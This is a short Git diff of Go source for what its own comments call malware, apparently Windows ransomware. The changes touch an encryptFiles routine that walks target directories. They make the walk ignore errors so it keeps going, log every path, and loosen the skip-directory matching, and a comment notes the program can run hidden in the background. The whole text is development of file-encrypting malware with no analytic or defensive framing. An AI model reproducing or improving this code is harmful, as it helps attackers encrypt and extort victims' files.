@@ -1,5 +1,5 @@
 // +build windows
-// +build go1.7
+// +build go1.8
 
 package main
 
@@ -33,7 +33,7 @@ var (
 )
 
 func init() {
-	// If you compile this program without "-H windowsgui" ldflag
+	// If you compile this program without "-H windowsgui"
 	// you can see a console window with all actions performed by
 	// the malware. Otherwise, the prints above and all logs will be
 	// discarted and it will run in background
@@ -116,12 +116,10 @@ func encryptFiles() {
 		// Loop over the interesting directories
 		for _, folder := range cmd.InterestingDirs {
 			filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
-				if err != nil {
-					cmd.Logger.Println(err)
-					return err
-				}
+				// we doesn't care about the err returned here
+				cmd.Logger.Println("Walking " + path)
 
-				if utils.StringInSlice(filepath.Base(path), cmd.SkippedDirs) {
+				if utils.SliceContainsSubstring(filepath.Base(path), cmd.SkippedDirs) {
 					cmd.Logger.Printf("Skipping dir %s", path)
 					return filepath.SkipDir
 				}
